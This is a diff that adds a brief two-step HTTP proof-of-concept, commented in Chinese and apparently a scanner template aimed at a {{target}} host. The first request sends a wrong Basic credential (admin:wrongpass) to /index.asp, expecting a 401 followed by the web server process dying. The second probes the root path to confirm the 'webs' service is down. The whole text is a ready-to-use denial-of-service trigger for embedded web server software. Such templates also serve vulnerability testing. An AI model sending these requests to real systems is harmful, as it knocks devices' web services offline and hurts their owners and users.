@@ -1,0 +1,9 @@
+[Step 1] 错误 Basic 凭据触发（预期401后进程死亡）
+GET /index.asp HTTP/1.1
+Host: {{target}}
+Authorization: Basic YWRtaW46d3JvbmdwYXNz
+
+
+[Step 2] 探活（预期 000=webs 已死）
+GET / HTTP/1.1
+Host: {{target}}
